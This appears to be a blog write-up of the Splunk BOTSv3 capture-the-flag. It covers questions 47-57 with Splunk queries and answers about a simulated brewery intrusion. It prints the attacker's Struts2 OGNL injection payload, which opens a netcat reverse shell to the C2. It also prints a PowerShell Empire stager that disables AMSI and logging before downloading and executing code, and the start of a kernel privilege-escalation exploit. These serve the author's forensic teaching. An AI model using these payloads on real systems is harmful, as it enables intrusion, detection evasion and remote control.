![pic60](assets/images/botsv3/pic60.png)

Full conversation in `content_body` in nutshell:

```text
________________________________
From: HyunKi Kim <hyunki1984@naver.com>
Sent: Thursday, July 26, 2018 12:08 PM
To: Grace Hoppy
Subject: All your datas belong to us


Gracie,

       We brought your data and imported it: https://pastebin.com/sdBUkwsE =
Also, you should not be too hard Bruce. He good man

[https://pastebin.com/i/facebook.png]<https://pastebin.com/sdBUkwsE>

( ) ) ) - Pastebin.com<https://pastebin.com/sdBUkwsE>
pastebin.com

________________________________

     Bud,

 Uh... WTF ?!?!?

Billy,
 Is this real?

Jeremiah,
 Are these our customers?
```

I remember back in mid-2024, I spent almost an entire day trying to find the correct answer to this challenge. At the time, I hadn't constructed a proper kill chain, which made it difficult to correlate events. Interestingly, back then, the Pastebin URL (`https://pastebin.com/sdBUkwsE`) was still accessible and contained a list of compromised email addresses. That content has since been removed or deprecated.

While there may not have been a definitive answer to the original question, the investigation still yielded valuable insights, especially regarding internal issues within Frothly that I had overlooked during my initial CTF attempt.

#### Question 47 (322): What is the path of the URL being accessed by the command and control server? Answer guidance: Provide the full path. (Example: The full path for the URL https://imgur.com/a/mAqgt4S/lasd3.jpg is /a/mAqgt4S/lasd3.jpg)

Initially, I was a bit confused, was the question referring to a URL accessed by the victim machine, or by the C2 server itself? 

After rereading the wording, I assumed it referred to a URL accessed by the C2 server, specifically when the threat actor communicated with Frothly’s remote systems.

From previous analysis, we had already extracted the C2 server's IP address (`45.77.53.176`) from a **base64-encoded PowerShell** payload executed on `ABUNGST-L` and `FYODOR-L`.

To determine what path was accessed by the C2 server, I queried HTTP traffic involving that IP

```sql
index=botsv3 sourcetype=stream:http AND earliest="08/20/2018:18:00:00" AND 45.77.53.176
|reverse
|stats count by uri_path form_data
```

| uri_path                                          | form_data                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | count                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| ------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| /frothlyinventory/integration/saveGangster.action | age=1&__checkbox_bustedBefore=true&name=${(#szgx='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='/bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.close())}&description=1 | 2 |

Looking at the payload in form_data, it clearly contained malicious behavior:
- Command injection via OGNL expression: `(#cmd='/bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe')`
- Conditional logic based on OS and use of `cmd.exe` or `bash`
- Use of `ProcessBuilder` and Apache `ServletActionContext` to run commands and return output

This led me to discover the exploitation of an **Apache Struts2 OGNL injection vulnerability**, which allowed the attacker to achieve remote code execution (RCE).

You could read more about this vulnerability and exploitation from [Pentest-Tools](https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts), they had detailed their actions to exploit this vulnerability.

This filled a major gap in my previous kill chain analysis, specifically how the threat actor laterally moved from `FYODOR-L` to the Frothly web server (`192.168.9.30`) using a masqueraded binary named `iexeplored.exe` from the `/temp` directory.

However, despite all this, it turned out this was not the correct answer to the question.The question actually referred to the URL accessed by the victim’s endpoint after the PSEmpire C2 agent was implanted. The full PowerShell payload revealed that the compromised system contacted the endpoint - `/admin/get.php`

```powershell
# Check if PowerShell version is 3 or higher (to ensure required features exist)
If ($PSVErSIonTablE.PSVeRSIon.MAJOR  -ge 3)  {

    # Disable Script Block Logging by accessing internal .NET fields
    $GPF = [rEf].ASSemBlY.GETTyPE('System.Management.Automation.Utils')."GeTFIE`Ld"(
        'cachedGroupPolicySettings', 'NonPublic,Static'
    );

    IF ($GPF)  {
        # Get cached group policy settings
        $GPC = $GPF.GEtVALuE($null);

        # If ScriptBlockLogging is present, disable both settings
        If ($GPC['ScriptBlockLogging'])  {
            $GPC['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0;
            $GPC['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0;
        }

        # Prepare a fake group policy dictionary to suppress future logging
        $val = [Collections.Generic.Dictionary[String, System.Object]]::New();
        $val.Add('EnableScriptBlockLogging', 0);
        $val.Add('EnableScriptBlockInvocationLogging', 0);

        # Apply the modified settings to the registry override
        $GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = $val;
    } Else {
        # If GPC is unavailable, disable script signature logging as a fallback
        [ScriptBlock]."GetField"('signatures', 'NonPublic,Static').SetValue(
            $null, (New-Object Collections.Generic.HashSet[String])
        );
    }

    # Disable AMSI (Antimalware Scan Interface) by setting internal flag to true
    $ReF = [REF].ASSEMBLY.GetType('System.Management.Automation.AmsiUtils');
    $ReF.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true);
};

# Avoid HTTP overhead and prevent detection heuristics
[System.Net.ServicePointManager]::Expect100Continue = 0;

# Create a WebClient for downloading payload
$wC = New-Object System.Net.WebClient;

# Set a user-agent to mimic a legitimate browser
$u = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';

# Disable SSL/TLS certificate validation to avoid MITM detection
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };

# Add the user-agent twice to headers (potential evasion tactic)
$wc.Headers.Add('User-Agent', $u);
$wc.Headers.Add('User-Agent', $u); # Duplicate, may bypass some header checks

# Set proxy credentials to current user's default network credentials
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
$Script:Proxy = $wc.Proxy;

# Static key used for payload decryption (RC4 key)
$K = [System.Text.Encoding]::ASCII.GetBytes('1AB<Yk6Z4#+vVu%o5}8&M-9UL~l|>0gP');

# RC4 decryption function defined as a script block
$R = {
    $D, $K = $args;
    $S = 0..255;
    0..255 | % {
        $J = ($J + $S[$_] + $K[$_%$K.Count]) % 256;
        $S[$_], $S[$J] = $S[$J], $S[$_];
    };
    $D | % {
        $I = ($I + 1) % 256;
        $H = ($H + $S[$I]) % 256;
        $S[$I], $S[$H] = $S[$H], $S[$I];
        $_ -bxor $S[($S[$I] + $S[$H]) % 256];
    }
};

# Base64-decoded C2 server address (https://45.77.53.176:443)
$ser = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(
    'aAB0AHQAcABzADoALwAvADQANQAuADcANwAuADUAMwAuADEANwA2ADoANAA0ADMA'
)));

# Path to the malicious endpoint
$t = '/admin/get.php';

# Set a custom cookie header, possibly used for C2 session or ID
$wc.Headers.Add("Cookie", "PthAVgs=hB2H0GTIpwxCeLhGe/fLkfBpCdI=");

# Download the encrypted malicious payload
$data = $wc.DownloadData($ser + $t);

# Extract IV and ciphertext from payload
$iv = $data[0..3];
$data = $data[4..$data.Length];

# Decrypt and execute the payload in memory
-join [char[]](& $R $data ($iv + $K)) | IEX
```

> ANSWER: `/admin/get.php`
{: .prompt-info }


#### Question 48 (323): At least two Frothly endpoints contact the adversary's command and control infrastructure. What are their short hostnames? Answer guidance: Comma separated without spaces, in alphabetical order.

If you know, you know, we dicussed it several times above.

> ANSWER: `ABUNGST-L,FYODOR-L`
{: .prompt-info }

#### Question 49 (324): Who is Al Bungstein's cell phone provider/carrier? Answer guidance: Two words.

This question was a bit tricky and, notably, unrelated to the main incident. It’s one of those classic OSINT-style questions that test attention to detail, so for this one, I approached it accordingly.

Always, always started by stepping back to look at the big picture before drilling down.

To investigate activity from Al Bungstein’s machine (ABUNGST-L), I ran the following query to get an overview of available logs:

```sql
|metasearch index="botsv3" sourcetype=* host=ABUNGST-L
|stats count by sourcetype
|sort + count
```

| sourcetype             | count |
| ---------------------- | ----- |
| Script:GetEndpointInfo | 1     |
| Script:InstalledApps   | 2     |
| stream:smb             | 18    |
| stream:dhcp            | 28    |
| Script:ListeningPorts  | 66    |
| stream:igmp            | 89    |
| stream:icmp            | 304   |
| stream:arp             | 440   |
| xmlwineventlog         | 1479  |
| stream:http            | 1576  |
| wineventlog            | 2791  |
| stream:udp             | 4923  |
| stream:dns             | 8851  |
| WinHostMon             | 9658  |
| stream:tcp             | 10188 |
| stream:ip              | 11921 |

From the list, `Script:GetEndpointInfo` was a promising sourcetype to investigate further, it could contains detailed metadata about the host, including network information.

```sql
index="botsv3" sourcetype=Script:GetEndpointInfo host=ABUNGST-L
```

```log
2018-08-20 09:45:13 host_tz="Coordinated Universal Time" hostname="ABUNGST-L" local_ip="192.168.8.112" public_ip="174.215.1.81" local_mac="00:0c:29:bb:6c:e2" ip_location="37.6745,-122.0880" ip_city="Hayward" ip_country="US" ip_hostname="81.sub-174-215-1.myvzw.com" ip_org="AS22394 Cellco Partnership DBA Verizon Wireless" ip_postal="94541"
```

So, we found the answer right ? It's Verizon Wireless - a major U.S. mobile network operator and was once a dedicated division of Verizon Communications. In 2019, Verizon restructured its business units, integrating the wireless division under "Verizon Consumer" and "Verizon Business" brands, phasing out the standalone “Verizon Wireless” name in marketing materials. 

Nonetheless, the name still appears in technical registries and logs like this. As of March 31, 2025, Verizon remains the largest wireless provider in the U.S., with 146 million subscribers and LTE coverage across 2.68 million square miles.

>*In my country, we have similar telecom giants like Viettel, VNPT, and FPT, all offering telecommunications, mobile, and information technology services much like Verizon does in the U.S.*

>ANSWER: `Verizon Wireless`
{: .prompt-info }

#### Question 50 (325): Microsoft cloud services often have a delay or lag between "index time" and "event creation time". For the entire day, what is the max lag, in minutes, for the sourcetype: ms:aad:signin? Answer guidance: Round to the nearest minute without the unit of measure.

This question is pretty straightforward and doesn’t directly relate to the incident. Instead, it tests your understanding of how to calculate index-time vs. event-time lag using Splunk—especially with eval.

By default, Splunk doesn’t display _indextime (the time when the event was indexed) in the GUI. To view it, we need to extract and format it manually using:

```sql
|eval indextime=strftime(_indextime, "%Y-%m-%d %H:%M:%S")
```
This trick mentioned from [Splunk support forum](https://community.splunk.com/t5/Splunk-Search/How-to-display-index-time-in-table/m-p/84019)

The question specifically asks for the maximum delay in minutes, rounded to the nearest whole number. So, I built the following query:

```sql
index=botsv3 earliest=0 sourcetype=ms:aad:signin  
|eval delay = _indextime - _time
|eval delay_in_min = round(delay / 60, 0)
|table delay, delay_in_min
|sort - delay_in_min
```

This search calculates:
- The raw delay in seconds: _indextime - _time
- The delay in minutes, rounded to zero decimals: round(delay / 60, 0)

![pic61](assets/images/botsv3/pic61.png)

From the output we saw above, the max delay between event creation and index time was **51 minutes** - which is b-big i guess.

> ANSWER: `51`
{: .prompt-info }

#### Question 51 (326): According to Mallory's advertising research, how is beer meant to be enjoyed? Answer guidance: One word.

At this point in the CTF, **most incident-related questions have already been asked**. The remaining ones appear to be **OSINT-style** or **context-based** challenges, encouraging deeper exploration of the available sourcetypes and logs.

Given the context, this question seemed to be referencing Mallory’s marketing conversations, likely involving advertising language or branding ideas. So, I focused on reviewing **email conversations** where Mallory was involved.

To do this, I filtered the **SMTP traffic** for messages mentioning or sent by **Mallory**:

```sql
index="botsv3" sourcetype=stream:smtp mallory
|reverse
```

This query surfaced a series of emails titled **“Another good one”**, where Mallory and Frothly members shared advertising ideas. One email referred directly to the marketing material on the **Devils Backbone Brewing Company** website - **[https://www.dbbrewingcompany.com/beers/](https://www.dbbrewingcompany.com/beers/)**

![pic62](assets/images/botsv3/pic62.png)

And branding on the linked page - **Enjoy Responsibly** was the correct keyword for their advertising campaign ! 

> ANSWER: `Responsibly`
{: .prompt-info }

#### Question 52 (328): What text is displayed on line 2 of the file used to escalate tomcat8's permissions to root? Answer guidance: Provide contents of the entire line.

In the threat actor's kill chain, we previously identified two key vulnerabilities used to compromise the Frothly environment:
- Remote Code Execution (RCE) via a vulnerable Apache Struts2 endpoint.
- Privilege Escalation via a locally compiled and executed C-language exploit, allowing the attacker to escalate privileges from tomcat8 to root.

During the investigation, we extracted the C source file used for local privilege escalation. Here is an excerpt from the top of the file:

```c
/*
 * Ubuntu 16.04.4 kernel privilege escalation exploit <------- **THIS IS THE SECOND LINE THE QUESTION MENTIONED**
 * Credits to @bleidl
 * - vnik
 */

// Tested kernel version: 4.4.0-116-generic
// Adjust offsets if running on different kernels

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <linux/bpf.h>        // BPF subsystem (Berkeley Packet Filter)
#include <linux/unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/stat.h>
#include <stdint.h>

// Memory layout and structure offsets
#define PHYS_OFFSET 0xffff880000000000  // Start of kernel address space
#define CRED_OFFSET 0x5f8               // Offset of cred struct in task_struct
#define UID_OFFSET 4                    // Offset of UID in cred struct
#define LOG_BUF_SIZE 65536              // Buffer size for BPF log
#define PROGSIZE 328                    // Length of BPF program

int sockets[2];                         // UNIX socket pair
int mapfd, progfd;                      // File descriptors for BPF map and program

// Raw BPF bytecode that interacts with kernel memory
char * __prog = "\xb4\x09\x00\x00\xff\xff\xff\xff" /* ... (truncated for brevity) */
"\x95\x00\x00\x00\x00\x00\x00\x00";

....
```

According to the question, we're asked to provide the exact content of line 2 of the exploit source file. As seen above, the second line of the comment block is: `* Ubuntu 16.04.4 kernel priv esc`

> ANSWER: `* Ubuntu 16.04.4 kernel priv esc`
{: .prompt-info }

> **This C file was clearly custom-built to target a known vulnerability in the Ubuntu 16.04.4 kernel, specifically kernel version 4.4.0-116-generic as mentioned in the comments below the header. While this question doesn’t ask for CVE identification, it sets the stage for deeper technical analysis of the actual kernel vulnerability used, which we’ll cover in the next questions in technical details.**
{: .prompt-tip }

#### Question 53 (329): One of the files uploaded by Taedonggang contains a word that is a much larger in font size than any other in the file. What is that word?

Let’s start with a quick recap of the files attributed to Taedonggang during the attack campaign:

| File                                                                    | Description                                                                        |
| ----------------------------------------------------------------------- | ---------------------------------------------------------------------------------- |
| `Frothly-Brewery-Financial-Planning-FY2019-Draft.xlsm`                  | The initial malicious macro-enabled spreadsheet                                    |
| `BRUCE BIRTHDAY HAPPY HOUR PICS.lnk`                                    | A malicious shortcut file uploaded to SharePoint                                   |
| `bgist_froth_ly_SThumb.jpg`, `morebeer.jpg`, `stout-2.jpg`, `stout.png` | Images used in phishing lure preparation                                           |
| `hdoor.exe`                                                             | Network scanner used to discover vulnerable Apache Struts2 server (`192.168.9.30`) |
| `C:\windows\temp\unziped\lsof-master\iexeplorer.exe`                    | Exploit launcher for RCE against Frothly’s Apache server                           |
| `colonel.c`                                                             | Local privilege escalation exploit used post-compromise                            |
| `definitelydontinvestigatethisfile.sh`                                  | Troll image                                                                        |


Can you guess what it is ? In the center of the image, a single word is overwhelmingly visible, styled in much larger font size than anything else, bigger than a man head.

![pic59](assets/images/botsv3/pic59.jpg)
_SURPRISEEE!!_

IT IS **splunk** !

>ANSWER: `splunk`
{: .prompt-info }


#### Question 54 (330): What Frothly VPN user generated the most traffic? Answer guidance: Provide the VPN user name.
Back to Q303, we found an activity relate to VPN in `FYODOR-L` which is `C:\Program Files (x86)\Cisco\Cisco AnyConnect Secure Mobility Client\vpnagent.exe`

```sql
index=botsv3 sourcetype=xmlwineventlog AND EventCode=1
AND host=FYODOR-L
AND earliest="08/20/2018:16:58:40" AND latest="08/20/2018:17:28:00"
|reverse
|table _time host CommandLine ParentCommandLine Image ParentImage
```
![pic64](assets/images/botsv3/pic64.png)

Traced back to this piece of software, i found several sourcetypes contain it that could be really interesting to look into.

```sql
|metasearch index=botsv3 sourcetype=* vpnagent
|stats count by sourcetype
|sort - count
```

| sourcetype                  | count |
| --------------------------- | ----- |
| `PerfmonMk:Process`         | 864   |
| `WinHostMon`                | 407   |
| `symantec:ep:packet:file`   | 299   |
| `syslog`                    | 101   |
| `wineventlog`               | 83    |
| `symantec:ep:traffic:file`  | 29    |
| `xmlwineventlog`            | 19    |
| `symantec:ep:behavior:file` | 2     |

From those sourcetypes, i found out syslog contain details of VPN traffic (which is forwarded from Cisco ASA firewall).

```sql
index=botsv3 sourcetype=syslog vpnagent
|stats sum(ibc) as inbound sum(obc) as outbound by liuidp
|eval total_traffic=inbound+outbound
|sort - total_traffic
```

| liuidp            | inbound | outbound | total_traffic |
| ----------------- | ------- | -------- | ------------- |
| BudStoll          | 40704   | 3531397  | 3572101       |
| MalloryKraeusen   | 659689  | 2256390  | 2916079       |
| PeatCerf          | 72465   | 504977   | 577442        |
| BruceGist         | 65917   | 228581   | 294498        |
| FyodorMalteskesko | 10131   | 7122     | 17253         |
| JeremiahWortoski  | 9916    | 6152     | 16068         |
| unknown           | 5608    | 4674     | 10282         |
| frothlyuser       | 898     | 635      | 1533          |


The table showed us that BudStoll generated most total traffics relate to `vpnagent.exe`, but i could not found the VPN user name.

I had to use provided hint, and the question suggested start directly from `cisco:asa`. Always good to know the sourcetype from the Bird's Eye View.

```sql
index=botsv3 sourcetype=cisco:asa | head 1000
|reverse
|fieldsummary 
|fields field values value 
|rex field=values max_match=0 "\"value\":\"(?<value>[^\"]+)\""
|fields field value
```

![pic65](assets/images/botsv3/pic65.png)

There were really some information relate to Frothy username, but `bstoll` wasnt correct answer, the main difference was i had to extract `teardown` traffic only - Teardown represent when a session expire, or in this situation, it means Frothly's member disconnect / reconnect their VPN software.

```
index=botsv3 sourcetype=cisco:asa teardown
|stats sum(bytes) by Username
```

![pic66](assets/images/botsv3/pic66.png)

>ANSWER: `mkraeusen`
{: .prompt-info }

#### Question 55 (331): Using Splunk commands only, what is the upper fence (UF) value of the interquartile range (IQR) of the count of event code 4688 by Windows hosts over the entire day? Use a 1.5 multiplier. Answer guidance: UF = Q3 + 1.5 x IQR

![confuse-cat](assets/images/botsv3/cat-cat-math.gif)
_Bruh, what on earth !_

Okay, okay, i understand, just bla bla bla (I don't understand).

Resources i've read:
- https://www.scribbr.com/statistics/interquartile-range/

By break it down, it’s just a matter of using the right Splunk built-in commands, and letting the engine do the math for you.

```sql
index=botsv3 sourcetype=wineventlog EventCode=4688 
|stats count by host
|sort + count 
|eventstats perc75(count) as Q3 perc25(count) as Q1
|eval IQR=Q3-Q1
|eval UF=Q3+1.5*IQR
```
Here’s the breakdown of what i did:
- EventCode=4688: Looks for process creation logs.
- stats count by host: Count how many process creation events per host.
- perc75(count) / perc25(count): Get the 75th percentile (Q3) and 25th percentile (Q1).
- IQR: Interquartile range (Q3 - Q1).
- UF: Upper Fence = Q3 + 1.5 * IQR.

![pic63](assets/images/botsv3/pic63.png)

>ANSWER: `1368`
{: .prompt-info }

> The reason why question asked us only use Splunk commands is when I manually tried to calculate the quartiles on paper using the raw counts, i got: Q3=987, Q1=465.5, which would make a completely different result.
{: .prompt-tip}

#### Question 56 (332): What is the CVE of the vulnerability that escalated permissions on Linux host hoth? Answer guidance: Submit in normal CVE format. (Example: cve-2018-9805)

I’ll be honest, this one pushed me a bit out of my comfort zone, as I wasn’t too familiar with the technical details of the vulnerability at first. The question introduces a Linux kernel privilege escalation vulnerability related to the BPF (Berkeley Packet Filter) subsystem.

Specifically, the issue stems from a flaw in the `check_alu_op` function, which fails to properly handle sign extension in certain 32-bit ALU operations. This flaw can be exploited to achieve local privilege escalation, initially leading to a Denial of Service (DoS) and then further abuse for root access.

In this challenge, the APT group Taedonggang leveraged this kernel vulnerability by compiling and executing the malicious file `colonel.c` on the compromised Linux system (`hoth`) to gain root privileges.

For anyone looking to understand the exploit in greater depth, I recommend this excellent write-up:
- [Linux Kernel - BPF Sign Extension Local Privilege Escalation](https://github.com/samaleyadeh/ECE-9609/blob/master/CVE-2017-16995.md)

> ANSWER: `CVE-2017-16995`
{: .prompt-info }

#### Question 57 (333): What is the CVE of the vulnerability that was exploited to run commands on Linux host hoth? Answer guidance: Submit in normal CVE format. (Example: cve-2018-9805)

By analyzing the threat actor’s activity in earlier questions, we were able to identify how they successfully moved laterally from Fyodor’s workstation to the Remote Web Server. The root cause was the exploitation of a **known critical vulnerability that allowed Remote Code Execution (RCE) in Apache Struts** - **CVE-2017-9791**

This vulnerability takes advantage of how Apache Struts2, a popular web application framework for Java, processes namespace input. The attack vector is an OGNL (Object-Graph Navigation Language) injection, where a malicious actor injects crafted expressions into HTTP requests, which are then parsed and executed by the vulnerable server.

To better understand how the vulnerability works, let’s compare the vulnerable version of the code to the patched version:

**Old Version - Being Exploited**
```java
		// Some code to save the gangster to the db as necessary
		GangsterForm gform = (GangsterForm) form;
		ActionMessages messages = new ActionMessages();
		messages.add("msg", new ActionMessage("Gangster " + gform.getName() + " added successfully"));
		
		addMessages(request, messages);

		return mapping.findForward("success");
```

In this version, the server directly parses user input (`gform.getName()`) and builds messages with it, making it possible to inject and evaluate OGNL expressions.

**Patched Version**
```java
		// Some code to save the gangster to the db as necessaryMore actions
		GangsterForm gform = (GangsterForm) form;
		ActionMessages messages = new ActionMessages();
		System.out.println(gform.getName());More actions
		messages.add("msg", new ActionMessage("struts1.gangsterAdded", gform.getName()));
		addMessages(request, messages);

		return mapping.findForward("success");
```

By injecting a malicious OGNL payload into the `gform` field, the attacker can chain together method calls and execute arbitrary commands on the vulnerable server. This effectively turns a crafted HTTP request into remote code execution on the target system.

McAfee had a very detailed in-depth analysis about this vulnerability - [Analyzing CVE-2017-9791: Apache Struts Vulnerability Can Lead to Remote Code Execution](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/analyzing-cve-2017-9791-apache-struts-vulnerability-can-lead-remote-code-execution/)

From my research, this vulnerability was widespread and impacted thousands of organizations worldwide. The biggest challenge wasn’t just patching, it was the fact that so many enterprise systems were deeply embedded in the Struts framework. Migrating business logic and workflows to another stack is costly and complex. Even though Apache released a patch, the framework itself has had a history of critical vulnerabilities, making risk mitigation extremely difficult.

> ANSWER: `CVE-2017-9791`
{: .prompt-info }

### Recap and What's Next

![pic67](assets/images/botsv3/pic67.png)

Over 2 hours estimated to read this write-up damn! And with that, we officially wrap up this CTF series.

Revisiting this challenge gave me a lot of valuable experiences, both good and bad. On the positive side, the improvement in my analysis and investigation skills was pretty clear. The first time i completed this CTF, it took me nearly a month. This time, i wrapped it up in just over two weeks, including the time spent writing. That says something. I’ve definitely gotten better at thinking through problems, recognizing patterns, and applying frameworks like MITRE ATT&CK and CBK. Those structured approaches made it much easier to know what to look for and how to pivot when something looked suspicious.

Of course, it wasn’t perfect. One thing I noticed is that the dataset felt a bit smaller compared to previous versions, which made the challenge slightly easier. That’s not necessarily a bad thing, it still required attention to detail, but at times, it made correlating events less complex than i’d like. Still, the depth of the scenario and the quality of the questions kept things interesting and educational.

In the next couple of months, i’ll be publishing more blog content focused on deep-dive analysis, real-world attack patterns, and forestic stuffs. Hope you enjoy it ! Thanks. 
